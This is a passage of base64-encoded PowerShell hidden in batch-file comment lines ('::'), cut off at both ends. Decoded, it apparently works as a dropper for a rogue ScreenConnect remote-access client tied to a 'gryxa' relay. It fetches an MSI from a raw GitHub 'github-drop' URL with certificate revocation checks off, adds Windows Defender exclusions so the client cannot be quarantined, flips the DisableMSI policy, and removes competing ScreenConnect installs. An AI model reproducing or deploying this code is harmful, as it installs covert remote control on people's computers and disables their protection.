::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuSW1hZ2VQYXRoDQogICAgJHJlbGF5
::ID0gJHNjcmlwdDpHcnl4YVJlbGF5SG9zdA0KICAgIGlmICgkaW1nIC1hbmQgKCRp
::bWcgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkaW1n
::IC1saWtlICIqJHJlbGF5KiIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGZvcmVh
::Y2ggKCRwcm9jIGluIChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmls
::dGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgICRibG9iID0gIiQoW3N0cmluZ10k
::cHJvYy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRwcm9jLkNvbW1hbmRMaW5l
::KSINCiAgICAgICAgaWYgKCRibG9iIC1saWtlICIqJGZwKiIgLWFuZCAoJGJsb2Ig
::LW1hdGNoICcoP2kpZ3J5eGFcLmNvbScgLW9yICgkcmVsYXkgLWFuZCAkYmxvYiAt
::bGlrZSAiKiRyZWxheSoiKSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0K
::ICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZmFsc2UNCn0NCg0KZnVuY3Rp
::b24gR2V0LUtlZXBGaW5nZXJwcmludHMgew0KICAgICRzZXQgPSBOZXctT2JqZWN0
::ICdTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5IYXNoU2V0W3N0cmluZ10nIChb
::U3RyaW5nQ29tcGFyZXJdOjpPcmRpbmFsSWdub3JlQ2FzZSkNCiAgICBmb3JlYWNo
::ICgkcyBpbiAoR2V0LVNldnJ6S2VlcCkpIHsgW3ZvaWRdJHNldC5BZGQoJHMpIH0N
::CiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIHsgW3ZvaWRdJHNldC5B
::ZGQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIH0NCiAgICAkY2ZnID0gR2V0LUdy
::eXhhRnANCiAgICBpZiAoJGNmZyAtYW5kIChUZXN0LUlzR3J5eGFGcCAkY2ZnKSkg
::eyBbdm9pZF0kc2V0LkFkZCgkY2ZnKSB9DQogICAgZWxzZWlmICgkc2NyaXB0Okdy
::eXhhRXhwZWN0ZWRGcCkgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0OkdyeXhhRXhw
::ZWN0ZWRGcCkgfQ0KICAgIGVsc2UgeyBbdm9pZF0kc2V0LkFkZCgkc2NyaXB0Okdy
::eXhhRGVmYXVsdEZwKSB9DQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZp
::Y2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUpKSB7DQogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90
::aW4gQCgnUnVubmluZycsJ1N0YXJ0UGVuZGluZycsJ0NvbnRpbnVlUGVuZGluZycp
::KSB7IGNvbnRpbnVlIH0NCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1wo
::KFswLTlhLWZdezE2fSlcKScpIHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVz
::WzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcCAtaW4gJHNjcmlwdDpT
::ZXZyektlZXApIHsgY29udGludWUgfQ0KICAgICAgICAgICAgaWYgKFRlc3QtSXNH
::cnl4YUZwICRmcCkgeyBbdm9pZF0kc2V0LkFkZCgkZnApOyBTZXQtR3J5eGFGcCAk
::ZnAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBAKCRzZXQpDQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtVGNwSG9zdFBvcnQoW3N0cmluZ10kSG9zdE5hbWUsIFtp
::bnRdJFBvcnQgPSA0NDMsIFtpbnRdJFRpbWVvdXRNcyA9IDgwMDApIHsNCiAgICBp
::ZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJGMgPSAk
::bnVsbA0KICAgIHRyeSB7DQogICAgICAgICRjID0gTmV3LU9iamVjdCBTeXN0ZW0u
::TmV0LlNvY2tldHMuVGNwQ2xpZW50DQogICAgICAgICRpYXIgPSAkYy5CZWdpbkNv
::bm5lY3QoJEhvc3ROYW1lLCAkUG9ydCwgJG51bGwsICRudWxsKQ0KICAgICAgICBp
::ZiAoLW5vdCAkaWFyLkFzeW5jV2FpdEhhbmRsZS5XYWl0T25lKCRUaW1lb3V0TXMs
::ICRmYWxzZSkpIHsgdHJ5IHsgJGMuQ2xvc2UoKSB9IGNhdGNoIHt9OyByZXR1cm4g
::JGZhbHNlIH0NCiAgICAgICAgJGMuRW5kQ29ubmVjdCgkaWFyKTsgcmV0dXJuICR0
::cnVlDQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfSBmaW5hbGx5IHsgaWYg
::KCRjKSB7IHRyeSB7ICRjLkNsb3NlKCkgfSBjYXRjaCB7fSB9IH0NCn0NCg0KZnVu
::Y3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmdd
::JFByb3BlcnR5TmFtZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgIHRyeSB7DQog
::ICAgICAgICRpID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxs
::ZXIuSW5zdGFsbGVyDQogICAgICAgICRkYiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVz
::b2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkNCiAgICAg
::ICAgJHYgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVgIEZST00gYFByb3Bl
::cnR5YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpDQogICAgICAg
::ICR2LkV4ZWN1dGUoKSB8IE91dC1OdWxsDQogICAgICAgICRyID0gJHYuRmV0Y2go
::KQ0KICAgICAgICBpZiAoLW5vdCAkcikgeyByZXR1cm4gJG51bGwgfQ0KICAgICAg
::ICByZXR1cm4gW3N0cmluZ10kci5TdHJpbmdEYXRhKDEpDQogICAgfSBjYXRjaCB7
::IHJldHVybiAkbnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0
::TmFtZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgew0KICAgIGlmICgkUHJvZHVjdE5h
::bWUgLW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5j
::dGlvbiBGaW5kLVByb2R1Y3RHdWlkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAka2V5LlBTQ2hpbGROYW1lIH0NCiAg
::ICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwNCn0NCg0KZnVuY3Rpb24g
::VGVzdC1TY1J1bm5pbmcoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw0
::MzogU3RhcnRQZW5kaW5nL0NvbnRpbnVlUGVuZGluZyA9IGxpdmUgc2Vzc2lvbiBp
::biBwcm9ncmVzcyDigJQgbmV2ZXIgdHJlYXQgYXMgZG93bg0KICAgICMgKHRoYXQg
::cmFjZSBjYXVzZWQgbXNpZXhlYyAveCBkdXJpbmcgY29ubmVjdCDihpIgR3Vlc3Qg
::ZHJvcCkuDQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAkZmFs
::c2UgfQ0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAiU2NyZWVuQ29ubmVj
::dCBDbGllbnQgKCRGaW5nZXJwcmludCkiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgcmV0dXJuIFtib29sXSgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMg
::LWluIEAoJ1J1bm5pbmcnLCAnU3RhcnRQZW5kaW5nJywgJ0NvbnRpbnVlUGVuZGlu
::ZycpKQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVNjU2VydmljZUV4aXN0cyhbc3RyaW5n
::XSRGaW5nZXJwcmludCkgew0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyBy
::ZXR1cm4gJGZhbHNlIH0NCiAgICByZXR1cm4gW2Jvb2xdKEdldC1TZXJ2aWNlIC1O
::YW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtU2NE
::aXIoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBmb3JlYWNoICgkYmFzZSBp
::biBAKCR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMp
::KSB7DQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoIChKb2luLVBh
::dGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIikp
::IHsgcmV0dXJuICR0cnVlIH0NCiAgICB9DQogICAgcmV0dXJuICRmYWxzZQ0KfQ0K
::DQpmdW5jdGlvbiBGaW5kLVJ1bm5pbmdHcnl4YUZwIHsNCiAgICAjIEw0NjogQU5Z
::IG5vbi1zZXZyeiBSdW5uaW5nL1BlbmRpbmcgU0MgaXMgbGl2ZSAtIG5ldmVyIGlu
::c3RhbGwgb3ZlciBpdC4NCiAgICAkY2ZnID0gR2V0LUdyeXhhRnANCiAgICBpZiAo
::JGNmZyAtYW5kIChUZXN0LVNjUnVubmluZyAkY2ZnKSAtYW5kICgkY2ZnIC1ub3Rp
::biAkc2NyaXB0OlNldnJ6S2VlcCkpIHsgcmV0dXJuICRjZmcuVG9Mb3dlcigpIH0N
::CiAgICBpZiAoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnAgLWFuZCAoVGVzdC1TY1J1
::bm5pbmcgJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApKSB7IHJldHVybiAkc2NyaXB0
::OkdyeXhhRXhwZWN0ZWRGcC5Ub0xvd2VyKCkgfQ0KICAgIGZvcmVhY2ggKCRzdmMg
::aW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJHN2
::Yy5TdGF0dXMgLW5vdGluIEAoJ1J1bm5pbmcnLCdTdGFydFBlbmRpbmcnLCdDb250
::aW51ZVBlbmRpbmcnKSkgeyBjb250aW51ZSB9DQogICAgICAgIGlmICgkc3ZjLk5h
::bWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7DQogICAgICAgICAgICAk
::ZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnAg
::LWluICRzY3JpcHQ6U2V2cnpLZWVwKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgICAg
::IHJldHVybiAkZnANCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJG51bGwN
::Cn0NCg0KZnVuY3Rpb24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7IHJldHVy
::biBbYm9vbF0oRmluZC1SdW5uaW5nR3J5eGFGcCkgfQ0KDQpmdW5jdGlvbiBHZXQt
::R3J5eGFTdGF0dXMoW3N0cmluZ10kZnApIHsNCiAgICAkc3ZjID0gR2V0LVNlcnZp
::Y2UgLU5hbWUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgICMgTDM5OiBTdGFydFBlbmRpbmcvQ29u
::dGludWVQZW5kaW5nID0gaGVhbHRoeS1pbi1wcm9ncmVzcyAobm90IEJST0tFTikN
::CiAgICAkcnVubmluZyA9IFtib29sXSgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWlu
::IEAoJ1J1bm5pbmcnLCdTdGFydFBlbmRpbmcnLCdDb250aW51ZVBlbmRpbmcnKSkN
::CiAgICAkZGlyID0gVGVzdC1TY0RpciAkZnANCiAgICAkZ3VpZCA9IEZpbmQtUHJv
::ZHVjdEd1aWQgJGZwDQogICAgJHRjcFIgPSAkdHJ1ZTsgJHRjcFUgPSAkdHJ1ZQ0K
::ICAgICMgc2tpcCBUQ1Agb24gaG90IHBhdGggd2hlbiBhbHJlYWR5IHJ1bm5pbmcg
::dW5sZXNzIERlZXAgKERlZXAgc2V0cyBFeHRyYT1kZWVwLXRjcCB2aWEgY2FsbGVy
::KQ0KICAgIGlmICgkRGVlcCAtb3IgLW5vdCAkcnVubmluZykgew0KICAgICAgICAk
::dGNwUiA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA0
::NDMNCiAgICAgICAgJHRjcFUgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5
::eGFVaUhvc3QgNDQzDQogICAgfQ0KICAgIGlmICgkcnVubmluZykgeyByZXR1cm4g
::IkhFQUxUSFl8JGZwfHJ1bm5pbmc9MXxyZWxheT0kdGNwUnx1aT0kdGNwVSIgfQ0K
::ICAgIGlmICgkc3ZjIC1hbmQgJGRpcikgeyByZXR1cm4gIkJST0tFTnwkZnB8c3Zj
::LXByZXNlbnQtc3RvcHBlZHxyZWxheT0kdGNwUnx1aT0kdGNwVSIgfQ0KICAgIGlm
::ICgtbm90ICRzdmMgLWFuZCAoJGRpciAtb3IgJGd1aWQpKSB7IHJldHVybiAiU1RV
::Q0t8JGZwfHJlZ2lzdGVyZWQtbm8tc2VydmljZXxyZWxheT0kdGNwUnx1aT0kdGNw
::VSIgfQ0KICAgIHJldHVybiAiQUJTRU5UfCRmcHxub3QtaW5zdGFsbGVkfHJlbGF5
::PSR0Y3BSfHVpPSR0Y3BVIg0KfQ0KDQpmdW5jdGlvbiBUZXN0LUdyeXhhSGVhbHRo
::IHsNCiAgICAjIEw0NjogcHJlZmVyIGFueSBsaXZlIG5vbi1zZXZyeiBTQyBvdmVy
::IGNmZyBFeHBlY3RlZEZwICh3cm9uZyBGUCBpbiBncnl4YS5jZmcgd2FzIGZhbHNl
::IERPV04pLg0KICAgICRsaXZlID0gRmluZC1SdW5uaW5nR3J5eGFGcA0KICAgIGlm
::ICgkbGl2ZSkgew0KICAgICAgICBTZXQtR3J5eGFGcCAkbGl2ZQ0KICAgICAgICBy
::ZXR1cm4gKEdldC1Hcnl4YVN0YXR1cyAkbGl2ZSkNCiAgICB9DQogICAgcmV0dXJu
::IChHZXQtR3J5eGFTdGF0dXMgKEdldC1Hcnl4YUZwKSkNCn0NCg0KZnVuY3Rpb24g
::Q2xlYXItR3J5eGFBcnAoW3N0cmluZ10kZnApIHsNCiAgICAkZ3VpZCA9IEZpbmQt
::UHJvZHVjdEd1aWQgJGZwDQogICAgZm9yZWFjaCAoJHIgaW4gQCgnSEtMTTpcU09G
::VFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs
::JywNCiAgICAgICAgICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMy
::Tm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwn
::KSkgew0KICAgICAgICBpZiAoJGd1aWQgLWFuZCAoVGVzdC1QYXRoICIkclwkZ3Vp
::ZCIpKSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAiJHJcJGd1aWQiIC1SZWN1
::cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAg
::ICAgIEdldC1DaGlsZEl0ZW0gJHIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAkZG4gPSAoR2V0LUl0
::ZW1Qcm9wZXJ0eSAkXy5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
::dWUpLkRpc3BsYXlOYW1lDQogICAgICAgICAgICBpZiAoJGRuIC1tYXRjaCAiU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgXCgkKFtyZWdleF06OkVzY2FwZSgkZnApKVwpIikg
::ew0KICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkXy5Q
::U1BhdGggLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0
::aW9uIFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50KFtzdHJpbmddJEZpbmdlcnByaW50
::KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAn
::IH0NCiAgICAjIEw0NTogSEFORFMtT0ZGIOKAlCBuZXZlciB1bmluc3RhbGwvc3Rv
::cC9kZWxldGUgQU5ZIFNjcmVlbkNvbm5lY3QNCiAgICByZXR1cm4gJ3JlZnVzZWQt
::aGFuZHMtb2ZmLXNjJw0KICAgIGlmIChUZXN0LVNjUnVubmluZyAkRmluZ2VycHJp
::bnQpIHsgcmV0dXJuICdyZWZ1c2VkLXJ1bm5pbmcnIH0NCiAgICAkbmFtZSA9ICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSINCiAgICAkZ3VpZCA9
::IEZpbmQtUHJvZHVjdEd1aWQgJEZpbmdlcnByaW50DQogICAgJiByZWcuZXhlIGRl
::bGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
::bnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1OdWxsDQogICAg
::JiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRc
::V2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgMj4mMSB8IE91dC1OdWxsDQogICAgaWYgKCRndWlkKSB7IFN0YXJ0LVBy
::b2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9u
::b3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtV2luZG93U3R5
::bGUgSGlkZGVuOyBTdGFydC1TbGVlcCAtU2Vjb25kcyA2IH0NCiAgICAkc3ZjID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoJHN2YykgeyAmIHNjLmV4ZSBzdG9wICRuYW1lIDI+JjEg
::fCBPdXQtTnVsbDsgJiBzYy5leGUgZGVsZXRlICRuYW1lIDI+JjEgfCBPdXQtTnVs
::bDsgU3RhcnQtU2xlZXAgLVNlY29uZHMgMiB9DQogICAgQ2xlYXItR3J5eGFBcnAg
::JEZpbmdlcnByaW50DQogICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9n
::cmFtRmlsZXMoeDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICAk
::ZCA9IEpvaW4tUGF0aCAkYmFzZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5n
::ZXJwcmludCkiDQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRk
::KSB7ICYgdGFrZW93bi5leGUgL0YgJGQgL1IgL0QgWSAyPiYxIHwgT3V0LU51bGw7
::IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgIH0NCiAgICByZXR1cm4g
::J3JlbW92ZWQnDQp9DQoNCmZ1bmN0aW9uIFRlc3QtTXNpUGFja2FnZShbc3RyaW5n
::XSRQYXRoLCBbc3RyaW5nXSRFeHBlY3RlZEZwID0gJycpIHsNCiAgICAjIFNoYXJl
::ZCBPTEUtbWFnaWMgKyBvcHRpb25hbCBQcm9kdWN0TmFtZSBGUCBnYXRlIChMMzcv
::TDM5KS4gVXNlZCBieSBHcnl4YSArIHNldnJ6IGluc3RhbGwgcGF0aHMuDQogICAg
::aWYgKC1ub3QgJFBhdGggLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
::JFBhdGgpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlmICgoR2V0LUl0ZW0gLUxp
::dGVyYWxQYXRoICRQYXRoKS5MZW5ndGggLWx0IDUwMDAwMCkgeyByZXR1cm4gJGZh
::bHNlIH0NCiAgICB0cnkgew0KICAgICAgICAkZnMgPSBbU3lzdGVtLklPLkZpbGVd
::OjpPcGVuUmVhZCgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkUGF0aCkuUGF0
::aCkNCiAgICAgICAgJG1hZ2ljID0gTmV3LU9iamVjdCBieXRlW10gNA0KICAgICAg
::ICAkbnVsbCA9ICRmcy5SZWFkKCRtYWdpYywgMCwgNCkNCiAgICAgICAgJGZzLkNs
::b3NlKCkNCiAgICAgICAgaWYgKC1ub3QgKCRtYWdpY1swXSAtZXEgMHhEMCAtYW5k
::ICRtYWdpY1sxXSAtZXEgMHhDRiAtYW5kICRtYWdpY1syXSAtZXEgMHgxMSAtYW5k
::ICRtYWdpY1szXSAtZXEgMHhFMCkpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgfSBj
::YXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlmICgkRXhwZWN0ZWRGcCkgew0K
::ICAgICAgICAkZnAgPSBHZXQtRnBGcm9tUHJvZHVjdE5hbWUgKEdldC1Nc2lQcm9w
::ZXJ0eSAkUGF0aCAnUHJvZHVjdE5hbWUnKQ0KICAgICAgICBpZiAoLW5vdCAkZnAg
::LW9yICRmcCAtbmUgJEV4cGVjdGVkRnAuVG9Mb3dlcigpKSB7IHJldHVybiAkZmFs
::c2UgfQ0KICAgIH0NCiAgICByZXR1cm4gJHRydWUNCn0NCg0KZnVuY3Rpb24gR2V0
::LUdyeXhhTXNpIHsNCiAgICAkbXNpID0gSm9pbi1QYXRoICRXb3JrRGlyICdwa2df
::Z3J5eGEubXNpJw0KICAgICMgV2hlbiBhbiBGUCBpcyBwaW5uZWQsIHRoZSBjYWNo
::ZWQgTVNJIG11c3QgbWF0Y2ggaXQ7IG90aGVyd2lzZSByZWZldGNoLg0KICAgIGlm
::ICgoVGVzdC1QYXRoICRtc2kpIC1hbmQgKChHZXQtSXRlbSAkbXNpKS5MZW5ndGgg
::LWd0IDEwMDAwMDApKSB7DQogICAgICAgIGlmICgtbm90ICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwKSB7IHJldHVybiAkbXNpIH0NCiAgICAgICAgaWYgKFRlc3QtTXNp
::UGFja2FnZSAkbXNpICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwKSB7IHJldHVybiAk
::bXNpIH0NCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRtc2kgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KICAgICR0
::bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2NfZ3J5eGFfezB9Lm1zaSIgLWYg
::W2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkNCiAgICAjIEwzMTogZ2l0
::aHViLWRyb3AgRklSU1QgKHJhdyB3b3JrcyBldmVuIHdoZW4gdWkuZ3J5eGEuY29t
::IFRMUyBpcyBicm9rZW4pLg0KICAgICR1cmxzID0gQCgNCiAgICAgICAgJ2h0dHBz
::Oi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJv
::cC9tYWluL3BrZ19ncnl4YS5tc2knLA0KICAgICAgICAkc2NyaXB0OkdyeXhhTXNp
::VXJsDQogICAgKQ0KICAgICRjdXJsID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9v
::dCAnU3lzdGVtMzJcY3VybC5leGUnDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAk
::Y3VybCkpIHsgJGN1cmwgPSAnY3VybC5leGUnIH0NCiAgICBmb3JlYWNoICgkdSBp
::biAkdXJscykgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgUmVtb3ZlLUl0
::ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlDQogICAgICAgICAgICAmICRjdXJsIC1MIC0tc3NsLW5vLXJldm9r
::ZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAkdG1wICR1
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgaWYgKChUZXN0LVBhdGggJHRt
::cCkgLWFuZCAoKEdldC1JdGVtICR0bXApLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsN
::CiAgICAgICAgICAgICAgICAkZXhwID0gaWYgKCRzY3JpcHQ6R3J5eGFFeHBlY3Rl
::ZEZwKSB7ICRzY3JpcHQ6R3J5eGFFeHBlY3RlZEZwIH0gZWxzZSB7ICcnIH0NCiAg
::ICAgICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Nc2lQYWNrYWdlICR0bXAgJGV4
::cCkpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgICAgIHRyeSB7IENvcHktSXRl
::bSAtTGl0ZXJhbFBhdGggJHRtcCAtRGVzdGluYXRpb24gJG1zaSAtRm9yY2UgLUVy
::cm9yQWN0aW9uIFN0b3A7IHJldHVybiAkbXNpIH0gY2F0Y2ggeyByZXR1cm4gJHRt
::cCB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2gge30NCiAgICB9DQog
::ICAgaWYgKFRlc3QtUGF0aCAkdG1wKSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0
::aCAkdG1wIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQog
::ICAgcmV0dXJuICRudWxsDQp9DQoNCmZ1bmN0aW9uIEFkZC1TY0RlZmVuZGVyRXhj
::bHVzaW9uKFtzdHJpbmddJEZwKSB7DQogICAgIyBFeGNsdWRlIHRoaXMgRlAncyBT
::QyBkaXJzICh3aWxkY2FyZCArIGV4cGxpY2l0KSBzbyBSVE0gY2FuJ3QgcXVhcmFu
::dGluZSB0aGUNCiAgICAjIGNsaWVudCBvbiBpbnN0YWxsLiBSZS1hc3NlcnRlZCBi
::ZWZvcmUgZXZlcnkgaW5zdGFsbC9taWdyYXRlIOKAlCBzdXJ2aXZlcyBGUCByb3Rh
::dGlvbnMuDQogICAgdHJ5IHsNCiAgICAgICAgJG5hbWVzID0gQCgiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCRGcCkiLCAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykNCiAg
::ICAgICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMoeDg2
::KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICAgICAgaWYgKC1ub3Qg
::JGJhc2UpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoJG4gaW4g
